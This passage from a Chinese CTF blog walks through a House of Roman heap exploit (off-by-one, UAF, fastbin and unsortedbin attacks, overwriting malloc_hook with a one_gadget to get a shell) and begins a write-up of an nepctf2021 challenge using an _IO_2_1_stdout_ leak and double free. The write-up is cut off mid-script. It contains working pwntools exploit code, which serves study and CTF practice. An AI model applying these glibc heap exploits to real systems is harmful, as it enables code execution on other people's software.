class="string">&quot;Malloc&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !v5 )</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Error&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Write&quot;</span>);</span><br><span class="line">    write_chunk(<span class="string">&quot;Write&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Free&quot;</span>);</span><br><span class="line">    free_chunk();</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">default</span>:</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid choice&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>malloc_chunk：用户输入 <code>size</code>, 然后 <code>malloc(size)</code> , 大小不限</li>
<li>write_chunk：往指定 <code>heap_ptr</code> 写入 <code>size+1</code> 字节数据，off-by-one（<code>Write</code>时只是校验指针是否为<code>0</code>）</li>
<li>free_chunk：调用 <code>free</code> 释放掉 <code>heap_ptr</code> ，不过没有清零，<code>double free</code> 和 <code>uaf</code></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">free_chunk</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v0; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nEnter index :&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v0);</span><br><span class="line">  <span class="keyword">if</span> ( v0 &lt;= <span class="number">0x13</span> )</span><br><span class="line">    <span class="built_in">free</span>(heap_ptrs[(<span class="keyword">unsigned</span> __int64)v0]); <span class="comment">// UAF</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>保护如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">04</span>:<span class="number">44</span> haclh@ubuntu:house_of_roman $ checksec ./new_chall</span><br><span class="line">[*] <span class="string">&#x27;/home/haclh/workplace/house_of_roman/new_chall&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<p><strong>分析外国老哥的exp：</strong></p>
<p>一，分配 <code>3</code> 个 <code>chunk</code> ，在 <code>chunk2 + 0x78</code> 处设置 <code>p64(0x61)</code> ， 作用是 <code>fake size</code> ，用于后面 的 <code>fastbin attack</code> </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">create(<span class="number">0x18</span>,<span class="number">0</span>) <span class="comment"># chunk1 </span></span><br><span class="line">create(<span class="number">0xc8</span>,<span class="number">1</span>) <span class="comment"># chunk2 </span></span><br><span class="line">create(<span class="number">0x65</span>,<span class="number">2</span>) <span class="comment"># chunk3 </span></span><br><span class="line"></span><br><span class="line">info(<span class="string">&quot;create 2 chunk, 0x20, 0xd8&quot;</span>)</span><br><span class="line">fake = <span class="string">&quot;A&quot;</span>*<span class="number">0x68</span></span><br><span class="line">fake += p64(<span class="number">0x61</span>)</span><br><span class="line">edit(<span class="number">1</span>,fake) <span class="comment"># set fakesize:0x71</span></span><br><span class="line">info(<span class="string">&quot;fake&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>二，释放掉 <code>chunk2</code> , 然后分配同样大小再次分配到 <code>chunk2</code> , 此时 <code>chunk2+0x10</code> 和 <code>chunk2+0x18</code> 中有 <code>main_arean</code> 的地址，分配 <code>3</code> 个 <code>fastbin</code> ，利用 <code>off-by-one</code> 修改 <code>chunk2-&gt;size = 0x71</code> </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">1</span>) <span class="comment"># chunk2 to unsortedbin</span></span><br><span class="line">create(<span class="number">0xc8</span>,<span class="number">1</span>) <span class="comment"># chunk2 new(include main_arena+88)</span></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x65</span>,<span class="number">3</span>) <span class="comment"># chunk4</span></span><br><span class="line">create(<span class="number">0x65</span>,<span class="number">15</span>) <span class="comment"># chunk16</span></span><br><span class="line">create(<span class="number">0x65</span>,<span class="number">18</span>) <span class="comment"># chunk19</span></span><br><span class="line"></span><br><span class="line">over = <span class="string">&quot;A&quot;</span>*<span class="number">0x18</span>  <span class="comment"># off by one</span></span><br><span class="line">over += <span class="string">&quot;\x71&quot;</span></span><br><span class="line">edit(<span class="number">0</span>,over) <span class="comment"># set chunk2-&gt;size =&gt; 0x71(编辑chunk1,溢出到chunk2)</span></span><br><span class="line">info(<span class="string">&quot;利用 off by one ,  chunk2&#x27;s size --&gt; 0x71&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>这里的 off-by-one 保证了 chunk2 可以进入大小为“0x70~0x80”的 fastbin</p>
<p>这样“main_arena+88”就会进入 fastbin 了（方便后续的 UAF 进行修改）</p>
<p>三，生成两个 <code>fastbin</code> ，然后利用 <code>uaf</code> ，部分地址写，把 <code>chunk1</code> 链入到 <code>fastbin</code> </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">info(<span class="string">&quot;创建两个 0x70 的 fastbin&quot;</span>)</span><br><span class="line">heap_po = <span class="string">&quot;\x20&quot;</span></span><br><span class="line">edit(<span class="number">3</span>,heap_po)</span><br><span class="line">info(<span class="string">&quot;把 chunk1 链入到 fastbin 里面&quot;</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x70</span>: <span class="number">0x555555757160</span> —▸ <span class="number">0x555555757020</span> —▸ <span class="number">0x7ffff7dd1b78</span> (main_arena+<span class="number">88</span>) ◂— <span class="number">0x7ffff7dd1b78</span></span><br></pre></td></tr></table></figure>
<ul>
<li>0x555555757160 就是 chunk4</li>
<li>0x555555757020 就是 chunk1(原本该是chunk3,但是末尾字节被覆盖了) </li>
</ul>
<p>四，通过修改 <code>chunk1-&gt;fd</code> 的低 <code>2</code> 字节， 使得 <code>chunk1-&gt;fd= malloc_hook - 0x23</code> </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">malloc_hook_nearly = <span class="string">&quot;\xed\x1a&quot;</span> <span class="comment"># 该地址为 malloc_hook 上方</span></span><br><span class="line">edit(<span class="number">1</span>,malloc_hook_nearly)</span><br><span class="line">info(<span class="string">&quot;部分写，修改 fastbin-&gt;fd ---&gt; malloc_hook&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>即把“main_arena+88”覆盖为“malloc_hook - 0x23”</p>
<p>五，然后分配 <code>3</code> 个 <code>0x70</code> 的 <code>chunk</code> ，就可以拿到 <code>malloc_hook</code> 所在的那个 <code>chunk</code> </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">create(<span class="number">0x65</span>,<span class="number">0</span>)</span><br><span class="line">create(<span class="number">0x65</span>,<span class="number">0</span>)</span><br><span class="line">create(<span class="number">0x65</span>,<span class="number">0</span>)</span><br><span class="line">info(<span class="string">&quot;0 拿到了 malloc_hook&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>注意：这里设置的是“malloc_hook - 0x23”，存在“\x7f”来通过检查</p>
<p>六，释放掉 <code>chunk16</code> ，进入 <code>fastbin</code> ，利用 <code>uaf</code> 设置 <code>chunk16-&gt;fd = 0</code> ， 修复了 <code>fastbin</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">free</span>(<span class="number">15</span>)</span><br><span class="line">edit(<span class="number">15</span>,p64(<span class="number">0x00</span>)) </span><br><span class="line">info(<span class="string">&quot;再次生成 0x71 的 fastbin, 同时修改 fd =0, 修复 fastbin&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>现在 fastbin 中只留有 chunk16 的地址（这个“修复”是什么意思，没有搞明白）</p>
<p>七，unsortedbin attack，使得 malloc_hook 被写入 main_arena+88 </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">create(<span class="number">0xc8</span>,<span class="number">1</span>) <span class="comment"># chunk2</span></span><br><span class="line">create(<span class="number">0xc8</span>,<span class="number">1</span>) <span class="comment"># chunk2</span></span><br><span class="line">create(<span class="number">0x18</span>,<span class="number">2</span>) <span class="comment"># chunk3</span></span><br><span class="line">create(<span class="number">0xc8</span>,<span class="number">3</span>) <span class="comment"># chunk4</span></span><br><span class="line">create(<span class="number">0xc8</span>,<span class="number">4</span>) <span class="comment"># chunk5</span></span><br><span class="line">free(<span class="number">1</span>) <span class="comment"># 大小为&quot;0xc8+0x10&quot;的chunk2进入unsortedbin</span></span><br><span class="line">po = <span class="string">&quot;B&quot;</span>*<span class="number">8</span></span><br><span class="line">po += <span class="string">&quot;\x00\x1b&quot;</span> <span class="comment"># 覆写FD的低地址,使其变为malloc_hook</span></span><br><span class="line">edit(<span class="number">1</span>,po)</span><br><span class="line">create(<span class="number">0xc8</span>,<span class="number">1</span>) <span class="comment"># 把chunk2申请回来,使malloc_hook变成unsortedbin中的最后一个chunk</span></span><br><span class="line">info(<span class="string">&quot;unsorted bin 使得 malloc_hook 有 libc 的地址&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>根据 unsortedbin 的特性，它会向 <code>第一个chunk</code> 和 <code>最后一个chunk</code> 中写入 <code>main_arena+xx</code> ，修改其FD指向 <code>malloc_hook</code> ，<code>最后一个chunk</code> 就变为了 <code>malloc_hook</code> ，当然会被写入 <code>main_arena+88</code></p>
<p>八，修改 <code>malloc_hook</code> 的低三个字节 ，使得 <code>malloc_hook</code> 为 <code>one_gadget</code> 的地址 </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">over = <span class="string">&quot;R&quot;</span>*<span class="number">0x13</span>   <span class="comment"># padding for malloc_hook</span></span><br><span class="line">over += <span class="string">&quot;\xa4\xd2\xaf&quot;</span></span><br><span class="line">edit(<span class="number">0</span>,over)</span><br><span class="line"></span><br><span class="line">info(<span class="string">&quot;malloc_hook to one_gadget&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>九，然后 <code>free</code> 两次同一个 <code>chunk</code> ，触发 <code>malloc_printerr</code> ， <code>getshell</code> </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">18</span>)</span><br><span class="line">free(<span class="number">18</span>)</span><br></pre></td></tr></table></figure>
<p>上面的偏移均为调试所得，开启 <code>aslr</code> 后，需要爆破程序</p>
<p><strong>利用条件：</strong></p>
<ul>
<li>UAF（对 fastbin 中的“main_arena+xx”进行修改，使其指向目标地址）</li>
<li>off-by-one（覆写“size”的大小，为了使保留有“main_arena+xx”进入fastbin）</li>
</ul>
<h2 id="版本对-House-Of-Roman-的影响"><a href="#版本对-House-Of-Roman-的影响" class="headerlink" title="版本对 House Of Roman 的影响"></a>版本对 House Of Roman 的影响</h2><p>House Of Roman 并不依赖于 libc 源码，它的思想完全可以独立使用（覆盖main_arena）</p>
<p>但是实现 House Of Roman 需要 fastbin attack，unsortedbin attack 等技术的配合，而它们会受 libc 版本影响：</p>
<p><strong>libc-2.27</strong></p>
<ul>
<li>fastbin attack 需要绕 tache（对chunk的数量有要求）</li>
<li>unsortedbin attack 可以直接打（只检查了“victim-&gt;size”，形同虚设）</li>
</ul>
<p><strong>libc-2.29</strong></p>
<ul>
<li>fastbin attack 需要绕 tache（对chunk的数量有要求）</li>
<li>unsortedbin attack 失效（其实也有办法可以绕过，只是条件苛刻）</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/13/IO_2_1_stdout%20leak+Double%20free/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/03/13/IO_2_1_stdout%20leak+Double%20free/" class="post-title-link" itemprop="url">_IO_2_1_stdout_ leak+Double free</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-03-13 12:11:51" itemprop="dateCreated datePublished" datetime="2022-03-13T12:11:51+08:00">2022-03-13</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-07-24 11:37:52" itemprop="dateModified" datetime="2022-07-24T11:37:52+08:00">2022-07-24</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Reappearance/" itemprop="url" rel="index"><span itemprop="name">Reappearance</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>7.4k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>7 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>nepctf2021 sooooeasy 复现</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">➜  [/home/ywhkkx/桌面] ./sooooeasy </span><br><span class="line">   NN     NN    EEEEEEEE    PPPPPP   </span><br><span class="line">   NNNN   NN    EE          PP   PP  </span><br><span class="line">   NN NN  NN    EEEEEEE     PPPPPP   </span><br><span class="line">   NN  NN NN    EE          PP       </span><br><span class="line">   NN   NNNN    EE          PP       </span><br><span class="line">   NN    NNN    EEEEEEEE    PP       </span><br><span class="line"></span><br><span class="line">   PLEASE SIGN IN:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> Add</span><br><span class="line"><span class="number">2.</span> Delete</span><br><span class="line"><span class="number">3.</span> Exit</span><br><span class="line">Your choice : </span><br></pre></td></tr></table></figure>
<p>标准堆模板（看上去没有“打印模块”和“修改模块”）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sooooeasy: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">2.6</span><span class="number">.32</span>, BuildID[sha1]=<span class="number">01</span>a6d58e17059a67f6576746d73859db1943e557, stripped</span><br><span class="line"></span><br><span class="line">[*] <span class="string">&#x27;/home/ywhkkx/桌面/sooooeasy&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<p>64位，dynamically，全开</p>
<p><strong>漏洞分析</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> index; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 canary; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  canary = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( !chunk_num )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Null!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;mumber&#x27;s index:&quot;</span>);</span><br><span class="line">  _isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;index);</span><br><span class="line">  <span class="keyword">if</span> ( index &lt;= <span class="number">0x13</span> &amp;&amp; chunk_list[index] )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)chunk_list[index] = <span class="number">0</span>;           <span class="comment">// 置空inuse,释放name</span></span><br><span class="line">    <span class="built_in">free</span>(*(<span class="keyword">void</span> **)(chunk_list[index] + <span class="number">8LL</span>));  <span class="comment">// UAF</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Deleted!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;index error!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>明显的UAF</p>
<p><strong>heap结构</strong></p>
<p>本题目有以下结构体：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk_block</span>&#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> inuse;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> *name;</span><br><span class="line">    <span class="keyword">char</span> message[<span class="number">24</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>具体存储结构如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;1111&#x27;</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;2222&#x27;</span>,<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;3333&#x27;</span>,<span class="string">&#x27;cccc&#x27;</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xg <span class="number">0x5638534cc000</span></span><br><span class="line"><span class="number">0x5638534cc000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span> <span class="comment">// chunk_block1</span></span><br><span class="line"><span class="number">0x5638534cc010</span>:	<span class="number">0x0000000000000001</span>	<span class="number">0x00005638534cc040</span> <span class="comment">// addr of name1</span></span><br><span class="line"><span class="number">0x5638534cc020</span>:	<span class="number">0x0000000061616161</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5638534cc030</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span> <span class="comment">// name1</span></span><br><span class="line"><span class="number">0x5638534cc040</span>:	<span class="number">0x0000000a31313131</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5638534cc050</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5638534cc060</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span> <span class="comment">// chunk_block2</span></span><br><span class="line"><span class="number">0x5638534cc070</span>:	<span class="number">0x0000000000000001</span>	<span class="number">0x00005638534cc0a0</span> <span class="comment">// addr of name2</span></span><br><span class="line"><span class="number">0x5638534cc080</span>:	<span class="number">0x0000000062626262</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5638534cc090</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span> <span class="comment">// name2</span></span><br><span class="line"><span class="number">0x5638534cc0a0</span>:	<span class="number">0x0000000a32323232</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5638534cc0b0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5638534cc0c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span> <span class="comment">// chunk_block2</span></span><br><span class="line"><span class="number">0x5638534cc0d0</span>:	<span class="number">0x0000000000000001</span>	<span class="number">0x00005638534cc100</span> <span class="comment">// addr of name2</span></span><br><span class="line"><span class="number">0x5638534cc0e0</span>:	<span class="number">0x0000000063636363</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5638534cc0f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span> <span class="comment">// name2</span></span><br><span class="line"><span class="number">0x5638534cc100</span>:	<span class="number">0x0000000a33333333</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5638534cc110</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5638534cc120</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000020ee1</span></span><br></pre></td></tr></table></figure>
<p><strong>入侵思路</strong></p>
<p>本题的完全没法泄露信息，看来我的独立解题就到此为止了，接下来学习大佬的操作</p>
<p>​        // 如果可以 leak 出 libc_base，就可以打 Double free </p>
<p>大佬的exp：（大佬显然想打爆破，学习了）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.update(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,timeout=<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">name_size,name=<span class="string">&#x27;a&#x27;</span>,message=<span class="string">&#x27;b&#x27;</span></span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;choice : &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;your name: \n&#x27;</span>,<span class="built_in">str</span>(name_size))</span><br><span class="line">	p.sendafter(<span class="string">&#x27;Your name:\n&#x27;</span>,name)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Your message:\n&#x27;</span>,message)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;choice : &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;index:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pr</span>(<span class="params">a,addr</span>):</span></span><br><span class="line">	log.success(a+<span class="string">&#x27;===&gt;&#x27;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    <span class="comment"># over the “_IO_2_1_stdout - 0x43” (1/16)</span></span><br><span class="line">	add(<span class="number">0x60</span>) <span class="comment"># chunk0</span></span><br><span class="line">	add(<span class="number">0x90</span>) <span class="comment"># chunk1</span></span><br><span class="line">	add(<span class="number">0x60</span>) <span class="comment"># chunk2</span></span><br><span class="line">	delete(<span class="number">1</span>)</span><br><span class="line">	_IO_2_1_stdout_s = libc.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line">	add(<span class="number">0x60</span>,p16((<span class="number">2</span> &lt;&lt; <span class="number">12</span>) + ((_IO_2_1_stdout_s-<span class="number">0x43</span>) &amp; <span class="number">0xFFF</span>)))</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Double free to leak libc_base</span></span><br><span class="line">	delete(<span 